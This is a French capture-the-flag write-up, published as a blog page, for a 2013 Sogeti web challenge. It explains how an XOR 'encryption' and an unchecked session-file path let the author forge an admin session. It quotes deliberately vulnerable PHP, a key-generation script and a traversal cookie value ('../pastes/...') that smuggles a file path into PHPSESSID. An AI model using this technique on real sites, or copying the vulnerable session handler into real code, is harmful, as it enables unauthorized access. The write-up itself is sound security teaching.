@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <title>Writeup challenge Sogeti</title>
+    <meta name="description" content="" />
+
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="shortcut icon" href="//Techbrunch.github.io/hubpress.io/themes/Casper/favicon.ico">
+
+    <link rel="stylesheet" type="text/css" href="//Techbrunch.github.io/hubpress.io/themes/Casper/assets/css/screen.css?v=1.0.0" />
+    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic|Open+Sans:700,400" />
+
+    <link rel="canonical" href="https://Techbrunch.github.io/hubpress.io/2013/06/28/Writeup-challenge-Sogeti.html" />
+    
+    <meta property="og:site_name" content="" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="Writeup challenge Sogeti" />
+    <meta property="og:description" content="Dans cet article je vais décrire les étapes nécessaire à la résultion d&amp;#8217;un challenge réalisé à l&amp;#8217;occasion d&amp;#8217;un &quot;security event&quot; organisé par Sogeti le 25 juin 2013. Sur la page d&amp;#8217;accueil le..." />
+    <meta property="og:url" content="https://Techbrunch.github.io/hubpress.io/2013/06/28/Writeup-challenge-Sogeti.html" />
+    <meta property="article:published_time" content="2013-06-27T22:00:00.000Z" />
+    <meta property="article:modified_time" content="2015-04-05T12:23:25.720Z" />
+    <meta property="article:tag" content="security" />
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:title" content="Writeup challenge Sogeti" />
+    <meta name="twitter:description" content="Dans cet article je vais décrire les étapes nécessaire à la résultion d&amp;#8217;un challenge réalisé à l&amp;#8217;occasion d&amp;#8217;un &quot;security event&quot; organisé par Sogeti le 25 juin 2013. Sur la page d&amp;#8217;accueil le..." />
+    <meta name="twitter:url" content="https://Techbrunch.github.io/hubpress.io/2013/06/28/Writeup-challenge-Sogeti.html" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "Article",
+    "publisher": "",
+    "author": {
+        "@type": "Person",
+        "name": null,
+        "image": "https://avatars.githubusercontent.com/u/1835765?v=3",
+        "url": "undefined/author/undefined",
+        "sameAs": "http://techbrunch.github.io/"
+    },
+    "headline": "Writeup challenge Sogeti",
+    "url": "https://Techbrunch.github.io/hubpress.io/2013/06/28/Writeup-challenge-Sogeti.html",
+    "datePublished": "2013-06-27T22:00:00.000Z",
+    "dateModified": "2015-04-05T12:23:25.720Z",
+    "keywords": "security",
+    "description": "Dans cet article je vais décrire les étapes nécessaire à la résultion d&amp;#8217;un challenge réalisé à l&amp;#8217;occasion d&amp;#8217;un &quot;security event&quot; organisé par Sogeti le 25 juin 2013. Sur la page d&amp;#8217;accueil le..."
+}
+    </script>
+
+    <meta name="generator" content="Ghost ?" />
+    <link rel="alternate" type="application/rss+xml" title="" href="https://Techbrunch.github.io/hubpress.io/rss" />
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.4/styles/default.min.css">
+</head>
+<body class="post-template tag-security">
+
+    
+
+
+<header class="main-header post-head no-cover">
+    <nav class="main-nav  clearfix">
+        <a class="back-button icon-arrow-left" href="https://Techbrunch.github.io/hubpress.io">Home</a>
+        <!-- <a class="subscribe-button icon-feed" href="https://Techbrunch.github.io/hubpress.io/rss/">Subscribe</a> -->
+    </nav>
+</header>
+
+<main class="content" role="main">
+
+    <article class="post tag-security">
+
+        <header class="post-header">
+            <h1 class="post-title">Writeup challenge Sogeti</h1>
+            <section class="post-meta">
+                <time class="post-date" datetime="2013-06-28">28 June 2013</time>  on <a href="https://Techbrunch.github.io/hubpress.io/tag/security">security</a>
+            </section>
+        </header>
+
+        <section class="post-content">
+            <div id="preamble">
+<div class="sectionbody">
+<div class="paragraph">
+<p>Dans cet article je vais décrire les étapes nécessaire à la résultion d&#8217;un challenge réalisé à l&#8217;occasion d&#8217;un "security event" organisé par Sogeti le 25 juin 2013.</p>
+</div>
+<div class="paragraph">
+<p>Sur la page d&#8217;accueil le message suivant est présent :</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>Ce site web vous propose de stocker vos messages en ligne tout en les chiffrant à l'aide d'un algorithme inviolable.
+Votre but est d'accéder à la zone d'administration du site, une partie du code source est aussi disponible</pre>
+</div>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_un_algorithme_inviolable">Un algorithme inviolable ?</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Première étape, il va s&#8217;intéresser à cette algorithme soit disant inviolable.</p>
+</div>
+<div class="listingblock">
+<div class="title">add.php</div>
+<div class="content">
+<pre class="highlight"><code class="language-php" data-lang="php">&lt;?php
+
+include 'includes/init.php';
+
+if(isset($_POST['message']) &amp;&amp; isset($_POST['password']) &amp;&amp; strlen($_POST['password']) &gt;= 5)
+{
+    $name_file = md5(microtime());
+    $cipher = cipher_it($_POST['message'], stripslashes($_POST['password']));
+    $f = fopen(PASTE_DIRECTORY.$name_file, 'w+');
+    fwrite($f, $cipher);
+    fclose($f);
+    header("Location: show.php?id=".$name_file."&amp;password=".urlencode(stripslashes($_POST['password'])));
+    exit;
+}
+
+$pagename = "add";
+$title = "Nouveau message";
+include 'includes/header.php';
+?&gt;</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>La fonction utlisée pour encoder le message est <code>cipher_it</code> et prend en argument le message ainsi qu&#8217;un mot de passe pour l&#8217;encoder.</p>
+</div>
+<div class="paragraph">
+<p>Cette même fonction est utilisée pour décoder le message :</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-php" data-lang="php">&lt;?php
+
+include 'includes/init.php';
+
+if(!isset($_GET['id']) || !isset($_GET['password']) || preg_match("/^[0-9a-f]{32}$/", $_GET['id']) == false)
+{
+    header("Location: index.php");
+    exit;
+}
+
+if(!is_file(PASTE_DIRECTORY.$_GET['id']))
+{
+    header("Location: index.php");
+    exit;
+}
+
+$f = fopen(PASTE_DIRECTORY.$_GET['id'], "rb");
+$content = cipher_it(fread($f, filesize(PASTE_DIRECTORY.$_GET['id'])), $_GET['password']);
+fclose($f);
+
+$pagename = "show";
+$title = "Voir un message";
+include 'includes/header.php';
+
+    echo "&lt;fieldset class=\"event_form\" style='text-align:left;'&gt;&lt;pre style='background:transparent;'&gt;".htmlspecialchars($content)."&lt;/pre&gt;&lt;/fieldset&gt;";
+
+include 'includes/footer.php';
+?&gt;</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Cela signifie que si l&#8217;on applique deux fois la fonction permettant d&#8217;encoder le message avec le même mot de passe, on retombe sur le message d&#8217;origine. On pense alors à la fonction <strong>xor</strong> souvent utilisée en crypto et qui possède cette propriété. De plus, on observe qu&#8217;il est possible d&#8217;accéder au message chiffré car la constante <strong>PASTE_DIRECTORY</strong> est définie dans le fichier <strong>consts.php</strong>.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-php" data-lang="php">&lt;?php
+define('PASTE_DIRECTORY', __DIR__.'/../pastes/');
+?&gt;</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Les fichiers seront donc accessibles à partir de cette adresse :</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>http://217.109.132.34/challenge/pastes/[MD5]</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>On va faire un petit test pour vérifier cette hypothèse. Si on chiffre le message test1 avec la clé test1 on se retrouve avec cette url :</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>http://217.109.132.34/challenge/show.php?id=56499aff7b85dd3778f3572b1b822176&amp;password=test1</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Pour accéder au message chiffré il faut se rendre à l&#8217;adresse suivante :</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>http://217.109.132.34/challenge/pastes/56499aff7b85dd3778f3572b1b822176</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Quand on ouvre le fichier avec un éditeur de texte on se retrouve avec que des zéros :</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>0000 0000 00</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>C&#8217;est donc bien la fonction <code>xor</code> qui est utilisée pour chiffrer les messages. On est donc désormais en mesure de créer des fichiers sur le serveur dont on maîtrise le contenu.</p>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_acc_s_la_page_d_administration">Accès à la page d&#8217;administration</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>L&#8217;objectif premier de ce challenge est d&#8217;accéder à la page d&#8217;administration, jeton un coup d&#8217;oeil au code source :</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-php" data-lang="php">&lt;?php
+
+include 'includes/init.php';
+
+$pagename = "admin";
+$title = "Administration";
+include 'includes/header.php';
+
+if(!isset($_SESSION['admin']) || $_SESSION['admin'] !== true)
+{
+    header("Location: index.php");
+    exit;
+}
+
+define('ADMIN', true);
+include 'admin_ok.php';
+
+include 'includes/footer.php';
+?&gt;</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>On remarque qu&#8217;il n&#8217;est possible d&#8217;accéder à la page d&#8217;administration que si la variable de session admin est à true. Il nous faudrait donc un moyen nous permettant de manipuler la session.</p>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_gestion_des_sessions">Gestion des sessions</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Intéressons nous maintenant aux fichiers <code>init.php</code> et <code>class_session.php</code> :</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-php" data-lang="php">&lt;?php
+class SuperSessionHandler{
+    private $savePath;
+
+    public function open($savePath, $sessionName){
+        $this-&gt;savePath = $savePath;
+        if (!is_dir($this-&gt;savePath)) {
+            mkdir($this-&gt;savePath, 0777);
+        }
+        return true;
+    }
+
+    public function close(){
+        return true;
+    }
+
+    public function read($id){
+        return (string)@file_get_contents("$this-&gt;savePath/$id");
+    }
+
+    public function write($id, $data){
+        return file_put_contents("$this-&gt;savePath/$id", $data) === false ? false : true;
+    }
+
+    public function destroy($id){
+        $file = "$this-&gt;savePath/$id";
+        if (file_exists($file)) {
+            unlink($file);
+        }
+        return true;
+    }
+
+    public function gc($maxlifetime){
+        foreach (glob("$this-&gt;savePath/*") as $file) {
+            if (filemtime($file) + $maxlifetime &lt; time() &amp;&amp; file_exists($file)) {
+                unlink($file);
+            }
+        }
+
+        return true;
+    }
+}
+?&gt;</code></pre>
+</div>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-php" data-lang="php">&lt;?php
+
+include 'includes/fonctions.php';
+include 'includes/consts.php';
+include 'includes/class_sessions.php';
+
+error_reporting(0);
+
+$s = new SuperSessionHandler();
+session_save_path(__DIR__.'/../sessions/');
+session_set_save_handler (
+        array(&amp;$s, 'open'),
+        array(&amp;$s, 'close'),
+        array(&amp;$s, 'read'),
+        array(&amp;$s, 'write'),
+        array(&amp;$s, 'destroy'),
+        array(&amp;$s, 'gc')
+        );
+session_start();
+?&gt;</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>On remarque qu&#8217;une classe a été crée permettant de redéfinir la manière dont seront stockées les sessions, les sessions sont stockée dans le dossier <strong>sessions</strong>. Pour accéder à la session il faut se rendre à l&#8217;adresse :</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>http://217.109.132.34/challenge/sessions/[PHPSESSID]</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Si on regarde de plus près la fonction <code>read</code>, il s&#8217;avère que le paramètre <code>id</code> n&#8217;est pas du tout contrôlé !</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-php" data-lang="php">&lt;?php
+    public function read($id){
+        return (string)@file_get_contents("$this-&gt;savePath/$id");
+    }
+?&gt;</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>On est donc en mesure de choisir le fichier qui sera utilisé comme session est modifiant le <code>PHPSESSID</code>.</p>
+</div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_r_solution_de_l_preuve">Résolution de l'épreuve</h2>
+<div class="sectionbody">
+<div class="paragraph">
+<p>Si on récapitule :</p>
+</div>
+<div class="ulist">
+<ul>
+<li>
+<p>Il nous est possible de créer sur le serveur un fichier au contenu arbitraire</p>
+</li>
+<li>
+<p>Pour accéder à la page d&#8217;administration il faut modifier sa session</p>
+</li>
+<li>
+<p>On a de la chance la gestion des sessions est personnalisée</p>
+</li>
+</ul>
+</div>
+<div class="paragraph">
+<p>On va donc crée un message chiffré qui sera utilisé comme fichier de session afin de se faire passer pour l&#8217;admin. Le contenu du fichier de session avec la variable admin à <code>true</code> ressemble à ça :</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>admin|b:1;</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Pour obtenir le message chiffré j&#8217;ai créé un petit script qui me génère une clé afin que le premier texte chiffré ne contienne que des caractère imprimables.</p>
+</div>
+<div class="listingblock">
+<div class="content">
+<pre class="highlight"><code class="language-php" data-lang="php">&lt;?php
+function xor_this($string,$key) {
+ // Our plaintext/ciphertext
+ $text =$string;
+
+ // Our output text
+ $outText = '';
+
+ // Iterate through each character
+ for($i=0;$i&lt;strlen($text);)
+ {
+     for($j=0;($j&lt;strlen($key) &amp;&amp; $i&lt;strlen($text));$j++,$i++)
+     {
+         $outText .= $text{$i} ^ $key{$j};
+         //echo 'i='.$i.', '.'j='.$j.', '.$outText{$i}.'&lt;br /&gt;'; //for debugging
+     }
+ }
+ return $outText;
+}
+
+function generateRandomString($length = 10) {
+    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    $randomString = '';
+    for ($i = 0; $i &lt; $length; $i++) {
+        $randomString .= $characters[rand(0, strlen($characters) - 1)];
+    }
+    return $randomString;
+}
+
+while(1){
+    $key =generateRandomString();
+    if(ctype_print(xor_this('admin|b:1;',$key))){
+        echo $key."&lt;br/&gt;";
+        echo ctype_print(xor_this('admin|b:1;',$key));
+        die();
+    }
+}
+?&gt;</code></pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Le principe est simple je génère une chaine de caractère aléatoire de même taille que le texte à chiffrer et je vérifie que le texte obtenu en sortie est constitué uniquement de caractère imprimables avec la fonction <code>ctype_print</code>.</p>
+</div>
+<div class="paragraph">
+<p>Clés qui fonctionnnent :</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>Y3BFOWOXlV
+KYNZAPHCcC
+GZV2KSEpds</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Une fois que l&#8217;on a la clé il suffit de chiffrer le message une première fois avec la clé, pour chiffrer à nouveau le résultat avec cette même clé.</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>Clé     : FJQ5VPSStf
+Message : admin|b:1;
+Cipher  : '.&lt;\8,1iE]</pre>
+</div>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>Clé     : FJQ5VPSStf (clé)
+Message : '.&lt;\8,1iE] (cipher)
+Cipher  : admin|b:1;</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>On se rend à l&#8217;adresse du message chiffré et on retrouve bien notre message d&#8217;origine</p>
+</div>
+<div class="paragraph">
+<p>Il ne reste plus qu&#8217;a changé la valeur du <code>PHPSESSID</code> pour qu&#8217;il pointe sur notre message. Pour cela j&#8217;ai utilisé l&#8217;extension "Edit this cookie" pour Chrome et j&#8217;ai remplacé la valeur du <code>PHPSESSID</code> par :</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>../pastes/2790cdae372837fbc4347f63990bda54</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Et voila si l&#8217;on se rend sur la page d&#8217;administration le message affiché est désormais :</p>
+</div>
+<div class="literalblock">
+<div class="content">
+<pre>Félicitations !
+Le message caché est :
+Si tu es arrivé(e) jusque là c'est que tu peux aller jusqu'Issy !</pre>
+</div>
+</div>
+<div class="paragraph">
+<p>Au final une épreuve pas très compliquée mais intéressante :)</p>
+</div>
+</div>
+</div>
+        </section>
+
+        <footer class="post-footer">
+
+
+            <figure class="author-image">
+                <a class="img" href="" style="background-image: url(https://avatars.githubusercontent.com/u/1835765?v=3)"><span class="hidden">'s Picture</span></a>
+            </figure>
+
+            <section class="author">
+                <h4><a href=""></a></h4>
+
+                    <p>Read <a href="">more posts</a> by this author.</p>
+                <div class="author-meta">
+                    
+                    <span class="author-link icon-link"><a href="http://techbrunch.github.io/">http://techbrunch.github.io/</a></span>
+                </div>
+            </section>
+
+
+            <section class="share">
+                <h4>Share this post</h4>
+                <a class="icon-twitter" href="https://twitter.com/share?text=Writeup%20challenge%20Sogeti&amp;url=https://Techbrunch.github.io/hubpress.io/2013/06/28/Writeup-challenge-Sogeti.html"
+                    onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                    <span class="hidden">Twitter</span>
+                </a>
+                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://Techbrunch.github.io/hubpress.io/2013/06/28/Writeup-challenge-Sogeti.html"
+                    onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+                    <span class="hidden">Facebook</span>
+                </a>
+                <a class="icon-google-plus" href="https://plus.google.com/share?url=https://Techbrunch.github.io/hubpress.io/2013/06/28/Writeup-challenge-Sogeti.html"
+                   onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+                    <span class="hidden">Google+</span>
+                </a>
+            </section>
+
+        </footer>
+
+
+    </article>
+
+</main>
+
+
+
+    <footer class="site-footer clearfix">
+        <section class="copyright"><a href="https://Techbrunch.github.io/hubpress.io"></a> &copy; 2015</section>
+        <section class="poweredby">Proudly published with <a href="http://hubpress.io">HubPress</a></section>
+    </footer>
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js?v="></script> <script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.9.0/moment-with-locales.min.js?v="></script> <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.4/highlight.min.js?v="></script> 
+      <script type="text/javascript">
+        jQuery( document ).ready(function() {
+          // change date with ago
+          jQuery('ago.ago').each(function(){
+            var element = jQuery(this).parent();
+            element.html( moment(element.text()).fromNow());
+          });
+        });
+
+        hljs.initHighlightingOnLoad();      
+      </script>
+
+    <script type="text/javascript" src="//Techbrunch.github.io/hubpress.io/themes/Casper/assets/js/jquery.fitvids.js?v=1.0.0"></script>
+    <script type="text/javascript" src="//Techbrunch.github.io/hubpress.io/themes/Casper/assets/js/index.js?v=1.0.0"></script>
+
+</body>
+</html>
